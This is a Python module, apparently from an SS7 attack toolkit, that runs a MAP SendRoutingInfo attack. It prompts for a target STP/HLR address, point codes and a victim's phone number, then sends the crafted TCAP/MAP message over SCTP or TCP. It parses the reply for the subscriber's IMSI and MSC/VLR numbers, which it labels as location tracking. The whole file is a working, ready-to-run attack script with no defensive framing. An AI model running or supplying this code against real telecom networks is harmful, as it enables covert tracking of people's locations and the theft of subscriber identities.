#!/usr/bin/env python
"""
SendRoutingInfo (SRI) Attack Module
Uses proper MAP ASN.1 encoding for real SS7 network interaction.
"""
import sys
import os
import time
from scapy.all import *

# Import SS7 layers
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ss7.attacks.ss7_layers import *
from ss7.attacks.map_layer import SendRoutingInfo

def sri_main():
    print("\n" + "=" * 50)
    print(" SendRoutingInfo (SRI) Attack")
    print(" Location Tracking via Call Routing Query")
    print("=" * 50 + "\n")

    # Connection Configuration
    print("[1] Connection Configuration")
    print("-" * 30)
    remote_ip = get_input("Target IP (STP/HLR)", "10.0.0.1", validator=validate_ip)
    remote_port = int(get_input("Target Port", "2905"))
    local_port = int(get_input("Local Port", "2905"))
    
    # SS7 Configuration
    print("\n[2] SS7 Configuration")
    print("-" * 30)
    opc = int(get_input("Your Point Code (OPC)", "1"))
    dpc = int(get_input("Target Point Code (DPC)", "2"))
    
    # Attack Parameters
    print("\n[3] Attack Parameters")
    print("-" * 30)
    msisdn = get_input("Target MSISDN", "905551234567", validator=validate_msisdn)
    
    print("\n" + "=" * 50)
    print(" Building MAP SendRoutingInfo Message")
    print("=" * 50)
    
    # Create MAP message
    sri = SendRoutingInfo(msisdn)
    tcap_data = sri.to_tcap_begin()
    
    print(f"[+] Target MSISDN: {msisdn}")
    print(f"[+] MAP Operation: SendRoutingInfo (OpCode: 22)")
    print(f"[+] TCAP Message Size: {len(tcap_data)} bytes")
    
    # Show hex dump
    print("\n[+] TCAP/MAP Payload (Hex):")
    print("-" * 30)
    for i in range(0, len(tcap_data), 16):
        hex_part = ' '.join(f'{b:02x}' for b in tcap_data[i:i+16])
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in tcap_data[i:i+16])
        print(f"{i:04x}: {hex_part:<48} {ascii_part}")
    
    # Choose transport: SCTP (raw) or TCP fallback
    print("\n[+] Transport Selection:")
    print("    1) SCTP (raw - requires root/Linux)")
    print("    2) TCP  (works everywhere)")
    transport = get_input("Transport mode", "2")

    if transport == "1":
        # SCTP mode (original)
        print("\n[+] Building SS7 Packet Stack (SCTP)...")
        m3ua = M3UA(msg_class=1, msg_type=1)
        proto_data = M3UA_Param_Protocol_Data(opc=opc, dpc=dpc, si=3, ni=2)

        sctp = SCTP(sport=local_port, dport=remote_port)
        sctp_init = SCTPChunkInit()

        print(f"\n[+] Sending SCTP INIT to {remote_ip}:{remote_port}...")

        try:
            init_pkt = IP(dst=remote_ip) / sctp / sctp_init
            ans = sr1(init_pkt, timeout=5, verbose=0)

            if ans is None:
                print("\n[-] No SCTP response. Trying TCP fallback...")
                _tcp_sri_attack(remote_ip, remote_port, opc, dpc, tcap_data)
            elif ans.haslayer(SCTPChunkInitAck):
                print("[+] SCTP INIT-ACK received!")
                print("[+] Sending MAP SendRoutingInfo...")

                data_pkt = IP(dst=remote_ip) / SCTP(sport=local_port, dport=remote_port) / \
                           SCTPChunkData(data=bytes(m3ua/proto_data) + tcap_data)

                map_ans = sr1(data_pkt, timeout=5, verbose=0)

                if map_ans:
                    print("\n[+] Response received!")
                    if map_ans.haslayer(Raw):
                        _parse_sri_response(map_ans[Raw].load)
                    else:
                        map_ans.show()
                else:
                    print("[-] No MAP response (timeout)")
            elif ans.haslayer(SCTPChunkAbort):
                print("[-] SCTP ABORT. Trying TCP fallback...")
                _tcp_sri_attack(remote_ip, remote_port, opc, dpc, tcap_data)
            else:
                print("[-] No SCTP INIT ACK. Trying TCP fallback...")
                _tcp_sri_attack(remote_ip, remote_port, opc, dpc, tcap_data)

        except Exception as e:
            print(f"[-] SCTP Error: {e}")
            print("[*] Trying TCP fallback...")
            _tcp_sri_attack(remote_ip, remote_port, opc, dpc, tcap_data)
    else:
        # TCP mode
        _tcp_sri_attack(remote_ip, remote_port, opc, dpc, tcap_data)

    input("\nPress Enter to return...")


def _tcp_sri_attack(remote_ip, remote_port, opc, dpc, tcap_data):
    """Send SRI via TCP transport."""
    print("\n[+] Using TCP Transport...")
    try:
        from ss7.attacks.tcp_transport import tcp_attack
    except ImportError:
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        from ss7.attacks.tcp_transport import tcp_attack

    result = tcp_attack(remote_ip, remote_port, opc, dpc, tcap_data)

    print("\n" + "=" * 50)
    print(" SRI Attack Result")
    print("=" * 50)
    if result.get('success'):
        print("\033[32m[+] Response received!\033[0m")
        if result.get('imsi'):
            print(f"\033[32m[+] IMSI: {result['imsi']}\033[0m")
        if result.get('msc'):
            print(f"\033[32m[+] MSC:  {result['msc']}\033[0m")
        if result.get('vlr'):
            print(f"\033[32m[+] VLR:  {result['vlr']}\033[0m")
        if result.get('map_error'):
            print(f"\033[31m[-] MAP Error: {result['map_error']} ({result.get('map_error_name', '')})\033[0m")
    else:
        print(f"\033[31m[-] {result.get('error', 'Unknown error')}\033[0m")
        print("[*] Gateway may have SS7 firewall active.")

def _decode_tbcd(data):
    """Decode TBCD-encoded digits (IMSI/MSISDN)."""
    digits = ''
    for b in data:
        low = b & 0x0F
        high = (b >> 4) & 0x0F
        if low < 10:
            digits += str(low)
        if high < 10 and high != 0x0F:
            digits += str(high)
    return digits


def _decode_address(data):
    """Decode ISDN-AddressString (MSISDN/IMSI with type prefix)."""
    if len(data) < 2:
        return ''
    # First byte: numbering type (0x91=international, 0x81=national, etc.)
    ntype = data[0]
    digits = _decode_tbcd(data[1:])
    if ntype == 0x91:
        return '+' + digits
    return digits


def _parse_asn1_tlv(data, offset=0):
    """Parse ASN.1 TLV at given offset. Returns (tag, value_bytes, next_offset)."""
    if offset >= len(data):
        return None, b'', offset
    tag = data[offset]
    offset += 1
    if offset >= len(data):
        return tag, b'', offset
    length = data[offset]
    offset += 1
    if length & 0x80:
        num_bytes = length & 0x7F
        length = 0
        for i in range(num_bytes):
            if offset < len(data):
                length = (length << 8) | data[offset]
                offset += 1
    end = min(offset + length, len(data))
    value = data[offset:end]
    return tag, value, end


def _parse_sri_response(data):
    """Parse SendRoutingInfo response with ASN.1 decoder."""
    print("\n" + "=" * 50)
    print(" SendRoutingInfo Response")
    print("=" * 50)

    print(f"[+] Response Size: {len(data)} bytes")
    print("[+] Raw Response (Hex):")
    for i in range(0, min(len(data), 128), 16):
        hex_part = ' '.join(f'{b:02x}' for b in data[i:i+16])
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data[i:i+16])
        print(f"    {i:04x}: {hex_part:<48} {ascii_part}")

    # Search for TCAP component portion
    found_data = {}

    # Scan for IMSI (TBCD encoded, 7-8 bytes)
    for i in range(len(data) - 6):
        tag = data[i]
        if i + 1 < len(data):
            length = data[i + 1]
            if tag == 0x04 and 6 <= length <= 9 and i + 2 + length <= len(data):
                possible = _decode_tbcd(data[i+2:i+2+length])
                if len(possible) >= 14 and possible.isdigit():
                    if 'imsi' not in found_data:
                        found_data['imsi'] = possible
                        print(f"\n\033[32m[+] IMSI Found: {possible}\033[0m")

            # ISDN-AddressString (MSISDN, MSC number, etc.)
            if tag in (0x80, 0x81, 0x82, 0x83, 0x84, 0x04) and 4 <= length <= 10:
                if i + 2 + length <= len(data):
                    val = data[i+2:i+2+length]
                    if val and val[0] in (0x91, 0x81, 0xA1):
                        addr = _decode_address(val)
                        if len(addr) >= 8:
                            ctx_tag = tag & 0x1F
                            if ctx_tag == 0 and 'msisdn' not in found_data:
                                found_data['msisdn'] = addr
                            elif ctx_tag == 1 and 'msc' not in found_data:
                                found_data['msc'] = addr
                                print(f"\033[32m[+] MSC Number: {addr}\033[0m")
                            elif ctx_tag == 4 and 'vlr' not in found_data:
                                found_data['vlr'] = addr
                                print(f"\033[32m[+] VLR Number: {addr}\033[0m")
                            elif 'address_' + str(ctx_tag) not in found_data:
                                found_data['address_' + str(ctx_tag)] = addr
                                print(f"[+] Address (ctx={ctx_tag}): {addr}")

    # Check for TCAP error
    for i in range(len(data)):
        if data[i] == 0x67:  # TCAP Abort
            print(f"\n\033[31m[-] TCAP Abort detected - request was rejected\033[0m")
            break
        if data[i] == 0x6C and i + 2 < len(data):  # Component portion
            if data[i+2] == 0xA3:  # ReturnError
                print(f"\n\033[31m[-] MAP ReturnError - operation rejected\033[0m")
                # Try to find error code
                for j in range(i+2, min(i+30, len(data))):
                    if data[j] == 0x02 and j+2 < len(data):  # INTEGER
                        err_code = data[j+2]
                        err_names = {
                            1: 'Unknown Subscriber', 6: 'Absent Subscriber',
                            9: 'Illegal Subscriber', 10: 'Bearer Service Not Provisioned',
                            12: 'Illegal Equipment', 21: 'Facility Not Supported',
                            27: 'Absent Subscriber SM', 34: 'System Failure',
                            35: 'Data Missing', 36: 'Unexpected Data Value',
                        }
                        print(f"    Error Code: {err_code} ({err_names.get(err_code, 'Unknown')})")
                        found_data['error'] = err_code
                        break
                break

    if not found_data:
        print("\n[*] Could not extract structured data from response.")
        print("[*] The response may be encrypted or in unexpected format.")

    return found_data


if __name__ == "__main__":
    sri_main()
